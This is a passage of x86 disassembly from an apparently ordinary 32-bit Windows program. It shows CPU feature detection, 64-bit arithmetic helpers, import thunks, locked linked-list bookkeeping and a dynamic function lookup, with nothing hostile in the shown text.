  404661:	53                   	push   %ebx
  404662:	e8 59 17 00 00       	call   0x405dc0
  404667:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40466b:	50                   	push   %eax
  40466c:	e8 4f 98 00 00       	call   0x40dec0
  404671:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404675:	52                   	push   %edx
  404676:	e8 05 98 00 00       	call   0x40de80
  40467b:	5a                   	pop    %edx
  40467c:	50                   	push   %eax
  40467d:	52                   	push   %edx
  40467e:	e8 9d 99 00 00       	call   0x40e020
  404683:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404687:	52                   	push   %edx
  404688:	e8 93 99 00 00       	call   0x40e020
  40468d:	8d 44 24 10          	lea    0x10(%esp),%eax
  404691:	50                   	push   %eax
  404692:	e8 29 98 00 00       	call   0x40dec0
  404697:	ff 04 24             	incl   (%esp)
  40469a:	71 92                	jno    0x40462e
  40469c:	52                   	push   %edx
  40469d:	e8 de 97 00 00       	call   0x40de80
  4046a2:	5a                   	pop    %edx
  4046a3:	50                   	push   %eax
  4046a4:	ff 74 24 10          	push   0x10(%esp)
  4046a8:	ff 74 24 24          	push   0x24(%esp)
  4046ac:	58                   	pop    %eax
  4046ad:	e8 4e 0a 00 00       	call   0x405100
  4046b2:	50                   	push   %eax
  4046b3:	e8 d5 ee ff ff       	call   0x40358d
  4046b8:	8d 44 24 14          	lea    0x14(%esp),%eax
  4046bc:	50                   	push   %eax
  4046bd:	e8 fe 97 00 00       	call   0x40dec0
  4046c2:	ff 74 24 10          	push   0x10(%esp)
  4046c6:	e8 8f 62 00 00       	call   0x40a95a
  4046cb:	31 c0                	xor    %eax,%eax
  4046cd:	ff 74 24 0c          	push   0xc(%esp)
  4046d1:	e8 7a 98 00 00       	call   0x40df50
  4046d6:	ff 74 24 08          	push   0x8(%esp)
  4046da:	e8 71 98 00 00       	call   0x40df50
  4046df:	ff 74 24 10          	push   0x10(%esp)
  4046e3:	e8 68 98 00 00       	call   0x40df50
  4046e8:	83 c4 14             	add    $0x14,%esp
  4046eb:	5b                   	pop    %ebx
  4046ec:	c2 04 00             	ret    $0x4
  4046ef:	ff 74 24 04          	push   0x4(%esp)
  4046f3:	e8 68 54 00 00       	call   0x409b60
  4046f8:	eb 02                	jmp    0x4046fc
  4046fa:	31 c0                	xor    %eax,%eax
  4046fc:	c2 04 00             	ret    $0x4
  4046ff:	53                   	push   %ebx
  404700:	57                   	push   %edi
  404701:	31 c0                	xor    %eax,%eax
  404703:	50                   	push   %eax
  404704:	50                   	push   %eax
  404705:	50                   	push   %eax
  404706:	50                   	push   %eax
  404707:	50                   	push   %eax
  404708:	e8 b3 98 00 00       	call   0x40dfc0
  40470d:	8b 54 24 20          	mov    0x20(%esp),%edx
  404711:	8d 0c 24             	lea    (%esp),%ecx
  404714:	e8 47 09 00 00       	call   0x405060
  404719:	8b 1d 4c 80 41 00    	mov    0x41804c,%ebx
  40471f:	83 fb 01             	cmp    $0x1,%ebx
  404722:	74 13                	je     0x404737
  404724:	ff 34 24             	push   (%esp)
  404727:	e8 6f dd ff ff       	call   0x40249b
  40472c:	21 c0                	and    %eax,%eax
  40472e:	74 07                	je     0x404737
  404730:	b8 01 00 00 00       	mov    $0x1,%eax
  404735:	eb 02                	jmp    0x404739
  404737:	31 c0                	xor    %eax,%eax
  404739:	21 c0                	and    %eax,%eax
  40473b:	74 05                	je     0x404742
  40473d:	e9 9e 00 00 00       	jmp    0x4047e0
  404742:	ff 34 24             	push   (%esp)
  404745:	68 ff ff ff ff       	push   $0xffffffff
  40474a:	e8 81 65 00 00       	call   0x40acd0
  40474f:	89 44 24 04          	mov    %eax,0x4(%esp)
  404753:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  404758:	74 7e                	je     0x4047d8
  40475a:	ff 74 24 2c          	push   0x2c(%esp)
  40475e:	ff 74 24 2c          	push   0x2c(%esp)
  404762:	5b                   	pop    %ebx
  404763:	5f                   	pop    %edi
  404764:	83 ff 00             	cmp    $0x0,%edi
  404767:	7f 0b                	jg     0x404774
  404769:	7c 05                	jl     0x404770
  40476b:	83 fb 00             	cmp    $0x0,%ebx
  40476e:	77 04                	ja     0x404774
  404770:	31 c0                	xor    %eax,%eax
  404772:	eb 05                	jmp    0x404779
  404774:	b8 01 00 00 00       	mov    $0x1,%eax
  404779:	09 c0                	or     %eax,%eax
  40477b:	74 1d                	je     0x40479a
  40477d:	8b 44 24 28          	mov    0x28(%esp),%eax
  404781:	50                   	push   %eax
  404782:	ff 74 24 28          	push   0x28(%esp)
  404786:	ff 74 24 0c          	push   0xc(%esp)
  40478a:	e8 21 68 00 00       	call   0x40afb0
  40478f:	99                   	cltd
  404790:	52                   	push   %edx
  404791:	50                   	push   %eax
  404792:	8f 44 24 0c          	pop    0xc(%esp)
  404796:	8f 44 24 0c          	pop    0xc(%esp)
  40479a:	ff 74 24 04          	push   0x4(%esp)
  40479e:	e8 2d 62 00 00       	call   0x40a9d0
  4047a3:	ff 74 24 0c          	push   0xc(%esp)
  4047a7:	ff 74 24 0c          	push   0xc(%esp)
  4047ab:	5b                   	pop    %ebx
  4047ac:	5f                   	pop    %edi
  4047ad:	3b 5c 24 28          	cmp    0x28(%esp),%ebx
  4047b1:	75 06                	jne    0x4047b9
  4047b3:	3b 7c 24 2c          	cmp    0x2c(%esp),%edi
  4047b7:	74 04                	je     0x4047bd
  4047b9:	31 c0                	xor    %eax,%eax
  4047bb:	eb 05                	jmp    0x4047c2
  4047bd:	b8 01 00 00 00       	mov    $0x1,%eax
  4047c2:	09 c0                	or     %eax,%eax
  4047c4:	74 0a                	je     0x4047d0
  4047c6:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  4047cd:	00 
  4047ce:	eb 08                	jmp    0x4047d8
  4047d0:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4047d7:	00 
  4047d8:	8b 44 24 10          	mov    0x10(%esp),%eax
  4047dc:	eb 02                	jmp    0x4047e0
  4047de:	31 c0                	xor    %eax,%eax
  4047e0:	ff 34 24             	push   (%esp)
  4047e3:	e8 68 97 00 00       	call   0x40df50
  4047e8:	83 c4 14             	add    $0x14,%esp
  4047eb:	5f                   	pop    %edi
  4047ec:	5b                   	pop    %ebx
  4047ed:	c2 10 00             	ret    $0x10

Disassembly of section .text:

00405000 <.text>:
  405000:	bd 00 00 00 00       	mov    $0x0,%ebp
  405005:	9c                   	pushf
  405006:	58                   	pop    %eax
  405007:	bd 00 00 00 00       	mov    $0x0,%ebp
  40500c:	89 c1                	mov    %eax,%ecx
  40500e:	35 00 00 20 00       	xor    $0x200000,%eax
  405013:	50                   	push   %eax
  405014:	9d                   	popf
  405015:	9c                   	pushf
  405016:	58                   	pop    %eax
  405017:	31 c8                	xor    %ecx,%eax
  405019:	74 3e                	je     0x405059
  40501b:	b8 01 00 00 00       	mov    $0x1,%eax
  405020:	0f a2                	cpuid
  405022:	89 d0                	mov    %edx,%eax
  405024:	25 00 00 80 00       	and    $0x800000,%eax
  405029:	74 2e                	je     0x405059
  40502b:	83 cd 02             	or     $0x2,%ebp
  40502e:	89 d0                	mov    %edx,%eax
  405030:	25 00 00 00 02       	and    $0x2000000,%eax
  405035:	74 0f                	je     0x405046
  405037:	83 cd 08             	or     $0x8,%ebp
  40503a:	89 d0                	mov    %edx,%eax
  40503c:	25 00 00 00 04       	and    $0x4000000,%eax
  405041:	74 03                	je     0x405046
  405043:	83 cd 10             	or     $0x10,%ebp
  405046:	b8 01 00 00 80       	mov    $0x80000001,%eax
  40504b:	0f a2                	cpuid
  40504d:	89 d0                	mov    %edx,%eax
  40504f:	25 00 00 00 80       	and    $0x80000000,%eax
  405054:	74 03                	je     0x405059
  405056:	83 cd 04             	or     $0x4,%ebp
  405059:	89 e8                	mov    %ebp,%eax
  40505b:	c3                   	ret
  40505c:	cc                   	int3
  40505d:	cc                   	int3
  40505e:	cc                   	int3
  40505f:	cc                   	int3
  405060:	52                   	push   %edx
  405061:	51                   	push   %ecx
  405062:	e8 79 90 00 00       	call   0x40e0e0
  405067:	c3                   	ret
  405068:	52                   	push   %edx
  405069:	51                   	push   %ecx
  40506a:	e8 c1 90 00 00       	call   0x40e130
  40506f:	c3                   	ret
  405070:	ff 25 70 74 41 00    	jmp    *0x417470
  405076:	ff 25 b4 74 41 00    	jmp    *0x4174b4
  40507c:	ff 25 b8 74 41 00    	jmp    *0x4174b8
  405082:	ff 25 bc 74 41 00    	jmp    *0x4174bc
  405088:	ff 25 c0 74 41 00    	jmp    *0x4174c0
  40508e:	ff 25 c4 74 41 00    	jmp    *0x4174c4
  405094:	ff 25 c8 74 41 00    	jmp    *0x4174c8
  40509a:	ff 25 cc 74 41 00    	jmp    *0x4174cc
  4050a0:	ff 25 d0 74 41 00    	jmp    *0x4174d0
  4050a6:	ff 25 d4 74 41 00    	jmp    *0x4174d4
  4050ac:	ff 25 d8 74 41 00    	jmp    *0x4174d8
  4050b2:	ff 25 dc 74 41 00    	jmp    *0x4174dc
  4050b8:	ff 25 e0 74 41 00    	jmp    *0x4174e0
  4050be:	ff 25 e4 74 41 00    	jmp    *0x4174e4
  4050c4:	ff 25 e8 74 41 00    	jmp    *0x4174e8
  4050ca:	ff 25 ec 74 41 00    	jmp    *0x4174ec
  4050d0:	ff 25 f0 74 41 00    	jmp    *0x4174f0
  4050d6:	ff 25 f4 74 41 00    	jmp    *0x4174f4
  4050dc:	ff 25 f8 74 41 00    	jmp    *0x4174f8
  4050e2:	ff 25 fc 74 41 00    	jmp    *0x4174fc
  4050e8:	ff 25 00 75 41 00    	jmp    *0x417500
  4050ee:	ff 25 04 75 41 00    	jmp    *0x417504
  4050f4:	ff 25 08 75 41 00    	jmp    *0x417508
  4050fa:	cc                   	int3
  4050fb:	cc                   	int3
  4050fc:	cc                   	int3
  4050fd:	cc                   	int3
  4050fe:	cc                   	int3
  4050ff:	cc                   	int3
  405100:	0f bf 00             	movswl (%eax),%eax
  405103:	c3                   	ret
  405104:	cc                   	int3
  405105:	cc                   	int3
  405106:	cc                   	int3
  405107:	cc                   	int3
  405108:	cc                   	int3
  405109:	cc                   	int3
  40510a:	cc                   	int3
  40510b:	cc                   	int3
  40510c:	cc                   	int3
  40510d:	cc                   	int3
  40510e:	cc                   	int3
  40510f:	cc                   	int3
  405110:	8b 54 24 04          	mov    0x4(%esp),%edx
  405114:	89 10                	mov    %edx,(%eax)
  405116:	c2 04 00             	ret    $0x4
  405119:	cc                   	int3
  40511a:	cc                   	int3
  40511b:	cc                   	int3
  40511c:	cc                   	int3
  40511d:	cc                   	int3
  40511e:	cc                   	int3
  40511f:	cc                   	int3
  405120:	09 d2                	or     %edx,%edx
  405122:	75 05                	jne    0x405129
  405124:	ba 6c 70 41 00       	mov    $0x41706c,%edx
  405129:	09 c9                	or     %ecx,%ecx
  40512b:	75 05                	jne    0x405132
  40512d:	b9 6c 70 41 00       	mov    $0x41706c,%ecx
  405132:	53                   	push   %ebx
  405133:	66 8b 02             	mov    (%edx),%ax
  405136:	83 c2 02             	add    $0x2,%edx
  405139:	66 8b 19             	mov    (%ecx),%bx
  40513c:	83 c1 02             	add    $0x2,%ecx
  40513f:	66 39 d8             	cmp    %bx,%ax
  405142:	75 0e                	jne    0x405152
  405144:	66 09 c0             	or     %ax,%ax
  405147:	75 ea                	jne    0x405133
  405149:	5b                   	pop    %ebx
  40514a:	b8 01 00 00 00       	mov    $0x1,%eax
  40514f:	85 c0                	test   %eax,%eax
  405151:	c3                   	ret
  405152:	5b                   	pop    %ebx
  405153:	31 c0                	xor    %eax,%eax
  405155:	85 c0                	test   %eax,%eax
  405157:	c3                   	ret
  405158:	cc                   	int3
  405159:	cc                   	int3
  40515a:	cc                   	int3
  40515b:	cc                   	int3
  40515c:	cc                   	int3
  40515d:	cc                   	int3
  40515e:	cc                   	int3
  40515f:	cc                   	int3
  405160:	52                   	push   %edx
  405161:	ff 74 24 08          	push   0x8(%esp)
  405165:	e8 d6 95 00 00       	call   0x40e740
  40516a:	5a                   	pop    %edx
  40516b:	c2 04 00             	ret    $0x4
  40516e:	cc                   	int3
  40516f:	cc                   	int3
  405170:	52                   	push   %edx
  405171:	51                   	push   %ecx
  405172:	ff 35 78 71 41 00    	push   0x417178
  405178:	e8 d2 01 00 00       	call   0x40534f
  40517d:	8b 00                	mov    (%eax),%eax
  40517f:	59                   	pop    %ecx
  405180:	5a                   	pop    %edx
  405181:	c3                   	ret
  405182:	50                   	push   %eax
  405183:	ff 35 78 71 41 00    	push   0x417178
  405189:	e8 c1 01 00 00       	call   0x40534f
  40518e:	8b 10                	mov    (%eax),%edx
  405190:	58                   	pop    %eax
  405191:	c3                   	ret
  405192:	cc                   	int3
  405193:	cc                   	int3
  405194:	cc                   	int3
  405195:	cc                   	int3
  405196:	cc                   	int3
  405197:	cc                   	int3
  405198:	cc                   	int3
  405199:	cc                   	int3
  40519a:	cc                   	int3
  40519b:	cc                   	int3
  40519c:	cc                   	int3
  40519d:	cc                   	int3
  40519e:	cc                   	int3
  40519f:	cc                   	int3
  4051a0:	50                   	push   %eax
  4051a1:	52                   	push   %edx
  4051a2:	ff 74 24 0c          	push   0xc(%esp)
  4051a6:	e8 d5 95 00 00       	call   0x40e780
  4051ab:	5a                   	pop    %edx
  4051ac:	58                   	pop    %eax
  4051ad:	c2 04 00             	ret    $0x4
  4051b0:	57                   	push   %edi
  4051b1:	56                   	push   %esi
  4051b2:	53                   	push   %ebx
  4051b3:	31 ff                	xor    %edi,%edi
  4051b5:	8b 44 24 14          	mov    0x14(%esp),%eax
  4051b9:	09 c0                	or     %eax,%eax
  4051bb:	7d 14                	jge    0x4051d1
  4051bd:	47                   	inc    %edi
  4051be:	8b 54 24 10          	mov    0x10(%esp),%edx
  4051c2:	f7 d8                	neg    %eax
  4051c4:	f7 da                	neg    %edx
  4051c6:	83 d8 00             	sbb    $0x0,%eax
  4051c9:	89 44 24 14          	mov    %eax,0x14(%esp)
  4051cd:	89 54 24 10          	mov    %edx,0x10(%esp)
  4051d1:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4051d5:	09 c0                	or     %eax,%eax
  4051d7:	7d 14                	jge    0x4051ed
  4051d9:	47                   	inc    %edi
  4051da:	8b 54 24 18          	mov    0x18(%esp),%edx
  4051de:	f7 d8                	neg    %eax
  4051e0:	f7 da                	neg    %edx
  4051e2:	83 d8 00             	sbb    $0x0,%eax
  4051e5:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4051e9:	89 54 24 18          	mov    %edx,0x18(%esp)
  4051ed:	09 c0                	or     %eax,%eax
  4051ef:	75 18                	jne    0x405209
  4051f1:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4051f5:	8b 44 24 14          	mov    0x14(%esp),%eax
  4051f9:	31 d2                	xor    %edx,%edx
  4051fb:	f7 f1                	div    %ecx
  4051fd:	89 c3                	mov    %eax,%ebx
  4051ff:	8b 44 24 10          	mov    0x10(%esp),%eax
  405203:	f7 f1                	div    %ecx
  405205:	89 da                	mov    %ebx,%edx
  405207:	eb 41                	jmp    0x40524a
  405209:	89 c3                	mov    %eax,%ebx
  40520b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40520f:	8b 54 24 14          	mov    0x14(%esp),%edx
  405213:	8b 44 24 10          	mov    0x10(%esp),%eax
  405217:	d1 eb                	shr    $1,%ebx
  405219:	d1 d9                	rcr    $1,%ecx
  40521b:	d1 ea                	shr    $1,%edx
  40521d:	d1 d8                	rcr    $1,%eax
  40521f:	09 db                	or     %ebx,%ebx
  405221:	75 f4                	jne    0x405217
  405223:	f7 f1                	div    %ecx
  405225:	89 c6                	mov    %eax,%esi
  405227:	f7 64 24 1c          	mull   0x1c(%esp)
  40522b:	89 c1                	mov    %eax,%ecx
  40522d:	8b 44 24 18          	mov    0x18(%esp),%eax
  405231:	f7 e6                	mul    %esi
  405233:	01 ca                	add    %ecx,%edx
  405235:	72 0e                	jb     0x405245
  405237:	3b 54 24 14          	cmp    0x14(%esp),%edx
  40523b:	77 08                	ja     0x405245
  40523d:	72 07                	jb     0x405246
  40523f:	3b 44 24 10          	cmp    0x10(%esp),%eax
  405243:	76 01                	jbe    0x405246
  405245:	4e                   	dec    %esi
  405246:	31 d2                	xor    %edx,%edx
  405248:	89 f0                	mov    %esi,%eax
  40524a:	4f                   	dec    %edi
  40524b:	75 07                	jne    0x405254
  40524d:	f7 da                	neg    %edx
  40524f:	f7 d8                	neg    %eax
  405251:	83 da 00             	sbb    $0x0,%edx
  405254:	5b                   	pop    %ebx
  405255:	5e                   	pop    %esi
  405256:	5f                   	pop    %edi
  405257:	c2 10 00             	ret    $0x10
  40525a:	00 00                	add    %al,(%eax)
  40525c:	cc                   	int3
  40525d:	cc                   	int3
  40525e:	cc                   	int3
  40525f:	cc                   	int3
  405260:	56                   	push   %esi
  405261:	8b 44 24 14          	mov    0x14(%esp),%eax
  405265:	0b c0                	or     %eax,%eax
  405267:	75 28                	jne    0x405291
  405269:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40526d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405271:	33 d2                	xor    %edx,%edx
  405273:	f7 f1                	div    %ecx
  405275:	8b d8                	mov    %eax,%ebx
  405277:	8b 44 24 08          	mov    0x8(%esp),%eax
  40527b:	f7 f1                	div    %ecx
  40527d:	8b f0                	mov    %eax,%esi
  40527f:	8b c3                	mov    %ebx,%eax
  405281:	f7 64 24 10          	mull   0x10(%esp)
  405285:	8b c8                	mov    %eax,%ecx
  405287:	8b c6                	mov    %esi,%eax
  405289:	f7 64 24 10          	mull   0x10(%esp)
  40528d:	03 d1                	add    %ecx,%edx
  40528f:	eb 47                	jmp    0x4052d8
  405291:	8b c8                	mov    %eax,%ecx
  405293:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  405297:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40529b:	8b 44 24 08          	mov    0x8(%esp),%eax
  40529f:	d1 e9                	shr    $1,%ecx
  4052a1:	d1 db                	rcr    $1,%ebx
  4052a3:	d1 ea                	shr    $1,%edx
  4052a5:	d1 d8                	rcr    $1,%eax
  4052a7:	0b c9                	or     %ecx,%ecx
  4052a9:	75 f4                	jne    0x40529f
  4052ab:	f7 f3                	div    %ebx
  4052ad:	8b f0                	mov    %eax,%esi
  4052af:	f7 64 24 14          	mull   0x14(%esp)
  4052b3:	8b c8                	mov    %eax,%ecx
  4052b5:	8b 44 24 10          	mov    0x10(%esp),%eax
  4052b9:	f7 e6                	mul    %esi
  4052bb:	03 d1                	add    %ecx,%edx
  4052bd:	72 0e                	jb     0x4052cd
  4052bf:	3b 54 24 0c          	cmp    0xc(%esp),%edx
  4052c3:	77 08                	ja     0x4052cd
  4052c5:	72 0f                	jb     0x4052d6
  4052c7:	3b 44 24 08          	cmp    0x8(%esp),%eax
  4052cb:	76 09                	jbe    0x4052d6
  4052cd:	4e                   	dec    %esi
  4052ce:	2b 44 24 10          	sub    0x10(%esp),%eax
  4052d2:	1b 54 24 14          	sbb    0x14(%esp),%edx
  4052d6:	33 db                	xor    %ebx,%ebx
  4052d8:	2b 44 24 08          	sub    0x8(%esp),%eax
  4052dc:	1b 54 24 0c          	sbb    0xc(%esp),%edx
  4052e0:	f7 da                	neg    %edx
  4052e2:	f7 d8                	neg    %eax
  4052e4:	83 da 00             	sbb    $0x0,%edx
  4052e7:	8b ca                	mov    %edx,%ecx
  4052e9:	8b d3                	mov    %ebx,%edx
  4052eb:	8b d9                	mov    %ecx,%ebx
  4052ed:	8b c8                	mov    %eax,%ecx
  4052ef:	8b c6                	mov    %esi,%eax
  4052f1:	5e                   	pop    %esi
  4052f2:	c2 10 00             	ret    $0x10
  4052f5:	ff 25 74 74 41 00    	jmp    *0x417474
  4052fb:	ff 25 78 74 41 00    	jmp    *0x417478
  405301:	ff 25 7c 74 41 00    	jmp    *0x41747c
  405307:	ff 25 80 74 41 00    	jmp    *0x417480
  40530d:	ff 25 84 74 41 00    	jmp    *0x417484
  405313:	ff 25 88 74 41 00    	jmp    *0x417488
  405319:	ff 25 8c 74 41 00    	jmp    *0x41748c
  40531f:	ff 25 90 74 41 00    	jmp    *0x417490
  405325:	ff 25 94 74 41 00    	jmp    *0x417494
  40532b:	ff 25 98 74 41 00    	jmp    *0x417498
  405331:	ff 25 9c 74 41 00    	jmp    *0x41749c
  405337:	ff 25 a0 74 41 00    	jmp    *0x4174a0
  40533d:	ff 25 a4 74 41 00    	jmp    *0x4174a4
  405343:	ff 25 a8 74 41 00    	jmp    *0x4174a8
  405349:	ff 25 ac 74 41 00    	jmp    *0x4174ac
  40534f:	ff 25 90 75 41 00    	jmp    *0x417590
  405355:	ff 25 60 76 41 00    	jmp    *0x417660
  40535b:	ff 25 84 76 41 00    	jmp    *0x417684
  405361:	ff 25 88 76 41 00    	jmp    *0x417688
  405367:	ff 25 8c 76 41 00    	jmp    *0x41768c
  40536d:	ff 25 90 76 41 00    	jmp    *0x417690
  405373:	ff 25 94 76 41 00    	jmp    *0x417694
  405379:	57                   	push   %edi
  40537a:	bf a8 86 41 00       	mov    $0x4186a8,%edi
  40537f:	57                   	push   %edi
  405380:	ff 15 0c 75 41 00    	call   *0x41750c
  405386:	a1 c4 80 41 00       	mov    0x4180c4,%eax
  40538b:	85 c0                	test   %eax,%eax
  40538d:	74 23                	je     0x4053b2
  40538f:	56                   	push   %esi
  405390:	8d 70 08             	lea    0x8(%eax),%esi
  405393:	ff 36                	push   (%esi)
  405395:	ff 15 10 75 41 00    	call   *0x417510
  40539b:	56                   	push   %esi
  40539c:	68 c4 80 41 00       	push   $0x4180c4
  4053a1:	e8 8c 87 00 00       	call   0x40db32
  4053a6:	a1 c4 80 41 00       	mov    0x4180c4,%eax
  4053ab:	59                   	pop    %ecx
  4053ac:	59                   	pop    %ecx
  4053ad:	85 c0                	test   %eax,%eax
  4053af:	75 df                	jne    0x405390
  4053b1:	5e                   	pop    %esi
  4053b2:	57                   	push   %edi
  4053b3:	ff 15 14 75 41 00    	call   *0x417514
  4053b9:	5f                   	pop    %edi
  4053ba:	c3                   	ret
  4053bb:	68 a8 86 41 00       	push   $0x4186a8
  4053c0:	ff 15 18 75 41 00    	call   *0x417518
  4053c6:	c3                   	ret
  4053c7:	ff 74 24 04          	push   0x4(%esp)
  4053cb:	e8 1a 00 00 00       	call   0x4053ea
  4053d0:	85 c0                	test   %eax,%eax
  4053d2:	74 11                	je     0x4053e5
  4053d4:	6a 00                	push   $0x0
  4053d6:	50                   	push   %eax
  4053d7:	ff 15 1c 75 41 00    	call   *0x41751c
  4053dd:	f7 d8                	neg    %eax
  4053df:	1b c0                	sbb    %eax,%eax
  4053e1:	f7 d8                	neg    %eax
  4053e3:	eb 02                	jmp    0x4053e7
  4053e5:	33 c0                	xor    %eax,%eax
  4053e7:	c2 04 00             	ret    $0x4
  4053ea:	53                   	push   %ebx
  4053eb:	56                   	push   %esi
  4053ec:	57                   	push   %edi
  4053ed:	bb a8 86 41 00       	mov    $0x4186a8,%ebx
  4053f2:	33 ff                	xor    %edi,%edi
  4053f4:	53                   	push   %ebx
  4053f5:	ff 15 0c 75 41 00    	call   *0x41750c
  4053fb:	8b 35 c4 80 41 00    	mov    0x4180c4,%esi
  405401:	85 f6                	test   %esi,%esi
  405403:	74 22                	je     0x405427
  405405:	8b 44 24 10          	mov    0x10(%esp),%eax
  405409:	39 46 0c             	cmp    %eax,0xc(%esi)
  40540c:	74 08                	je     0x405416
  40540e:	8b 36                	mov    (%esi),%esi
  405410:	85 f6                	test   %esi,%esi
  405412:	75 f5                	jne    0x405409
  405414:	eb 11                	jmp    0x405427
  405416:	57                   	push   %edi
  405417:	ff 76 08             	push   0x8(%esi)
  40541a:	ff 15 1c 75 41 00    	call   *0x41751c
  405420:	85 c0                	test   %eax,%eax
  405422:	74 03                	je     0x405427
  405424:	8b 7e 08             	mov    0x8(%esi),%edi
  405427:	53                   	push   %ebx
  405428:	ff 15 14 75 41 00    	call   *0x417514
  40542e:	8b c7                	mov    %edi,%eax
  405430:	5f                   	pop    %edi
  405431:	5e                   	pop    %esi
  405432:	5b                   	pop    %ebx
  405433:	c2 04 00             	ret    $0x4
  405436:	53                   	push   %ebx
  405437:	56                   	push   %esi
  405438:	57                   	push   %edi
  405439:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40543d:	6a 00                	push   $0x0
  40543f:	57                   	push   %edi
  405440:	e8 a5 ff ff ff       	call   0x4053ea
  405445:	50                   	push   %eax
  405446:	ff 15 20 75 41 00    	call   *0x417520
  40544c:	bb a8 86 41 00       	mov    $0x4186a8,%ebx
  405451:	53                   	push   %ebx
  405452:	ff 15 0c 75 41 00    	call   *0x41750c
  405458:	8b 35 c4 80 41 00    	mov    0x4180c4,%esi
  40545e:	eb 07                	jmp    0x405467
  405460:	39 7e 0c             	cmp    %edi,0xc(%esi)
  405463:	74 08                	je     0x40546d
  405465:	8b 36                	mov    (%esi),%esi
  405467:	85 f6                	test   %esi,%esi
  405469:	75 f5                	jne    0x405460
  40546b:	eb 18                	jmp    0x405485
  40546d:	83 c6 08             	add    $0x8,%esi
  405470:	ff 36                	push   (%esi)
  405472:	ff 15 10 75 41 00    	call   *0x417510
  405478:	56                   	push   %esi
  405479:	68 c4 80 41 00       	push   $0x4180c4
  40547e:	e8 af 86 00 00       	call   0x40db32
  405483:	59                   	pop    %ecx
  405484:	59                   	pop    %ecx
  405485:	53                   	push   %ebx
  405486:	ff 15 14 75 41 00    	call   *0x417514
  40548c:	5f                   	pop    %edi
  40548d:	5e                   	pop    %esi
  40548e:	5b                   	pop    %ebx
  40548f:	c2 04 00             	ret    $0x4
  405492:	51                   	push   %ecx
  405493:	55                   	push   %ebp
  405494:	56                   	push   %esi
  405495:	8d 44 24 08          	lea    0x8(%esp),%eax
  405499:	33 f6                	xor    %esi,%esi
  40549b:	50                   	push   %eax
  40549c:	56                   	push   %esi
  40549d:	ff 74 24 1c          	push   0x1c(%esp)
  4054a1:	ff 74 24 1c          	push   0x1c(%esp)
  4054a5:	68 00 10 00 00       	push   $0x1000
  4054aa:	56                   	push   %esi
  4054ab:	ff 15 24 75 41 00    	call   *0x417524
  4054b1:	8b e8                	mov    %eax,%ebp
  4054b3:	85 ed                	test   %ebp,%ebp
  4054b5:	74 73                	je     0x40552a
  4054b7:	57                   	push   %edi
  4054b8:	68 a8 86 41 00       	push   $0x4186a8
  4054bd:	ff 15 0c 75 41 00    	call   *0x41750c
  4054c3:	8b 3d c4 80 41 00    	mov    0x4180c4,%edi
  4054c9:	85 ff                	test   %edi,%edi
  4054cb:	74 31                	je     0x4054fe
  4054cd:	53                   	push   %ebx
  4054ce:	56                   	push   %esi
  4054cf:	8d 5f 08             	lea    0x8(%edi),%ebx
  4054d2:	ff 33                	push   (%ebx)
  4054d4:	ff 15 1c 75 41 00    	call   *0x41751c
  4054da:	85 c0                	test   %eax,%eax
  4054dc:	75 19                	jne    0x4054f7
  4054de:	ff 33                	push   (%ebx)
  4054e0:	ff 15 10 75 41 00    	call   *0x417510
  4054e6:	8b 3f                	mov    (%edi),%edi
  4054e8:	53                   	push   %ebx
  4054e9:	68 c4 80 41 00       	push   $0x4180c4
  4054ee:	e8 3f 86 00 00       	call   0x40db32
  4054f3:	59                   	pop    %ecx
  4054f4:	59                   	pop    %ecx
  4054f5:	eb 02                	jmp    0x4054f9
  4054f7:	8b 3f                	mov    (%edi),%edi
  4054f9:	85 ff                	test   %edi,%edi
  4054fb:	75 d1                	jne    0x4054ce
  4054fd:	5b                   	pop    %ebx
  4054fe:	a1 14 71 41 00       	mov    0x417114,%eax
  405503:	8b f0                	mov    %eax,%esi
  405505:	40                   	inc    %eax
  405506:	6a 10                	push   $0x10
  405508:	68 c4 80 41 00       	push   $0x4180c4
  40550d:	a3 14 71 41 00       	mov    %eax,0x417114
  405512:	e8 5b 86 00 00       	call   0x40db72
  405517:	59                   	pop    %ecx
  405518:	59                   	pop    %ecx
  405519:	68 a8 86 41 00       	push   $0x4186a8
  40551e:	89 28                	mov    %ebp,(%eax)
  405520:	89 70 04             	mov    %esi,0x4(%eax)
  405523:	ff 15 14 75 41 00    	call   *0x417514
  405529:	5f                   	pop    %edi
  40552a:	8b c6                	mov    %esi,%eax
  40552c:	5e                   	pop    %esi
  40552d:	5d                   	pop    %ebp
  40552e:	59                   	pop    %ecx
  40552f:	c2 08 00             	ret    $0x8
  405532:	83 3d c8 80 41 00 00 	cmpl   $0x0,0x4180c8
  405539:	75 12                	jne    0x40554d
  40553b:	6a 01                	push   $0x1
  40553d:	ff 15 70 76 41 00    	call   *0x417670
  405543:	c7 05 c8 80 41 00 01 	movl   $0x1,0x4180c8
  40554a:	00 00 00 
  40554d:	ff 25 28 75 41 00    	jmp    *0x417528
  405553:	56                   	push   %esi
  405554:	8b 74 24 08          	mov    0x8(%esp),%esi
  405558:	57                   	push   %edi
  405559:	bf 1c 01 00 00       	mov    $0x11c,%edi
  40555e:	57                   	push   %edi
  40555f:	6a 00                	push   $0x0
  405561:	56                   	push   %esi
  405562:	e8 09 fb ff ff       	call   0x405070
  405567:	83 c4 0c             	add    $0xc,%esp
  40556a:	89 3e                	mov    %edi,(%esi)
  40556c:	68 00 30 41 00       	push   $0x413000
  405571:	ff 15 b4 74 41 00    	call   *0x4174b4
  405577:	85 c0                	test   %eax,%eax
  405579:	74 1a                	je     0x405595
  40557b:	68 14 30 41 00       	push   $0x413014
  405580:	50                   	push   %eax
  405581:	ff 15 2c 75 41 00    	call   *0x41752c
  405587:	85 c0                	test   %eax,%eax
  405589:	74 0a                	je     0x405595
  40558b:	56                   	push   %esi
  40558c:	ff d0                	call   *%eax
  40558e:	f7 d8                	neg    %eax
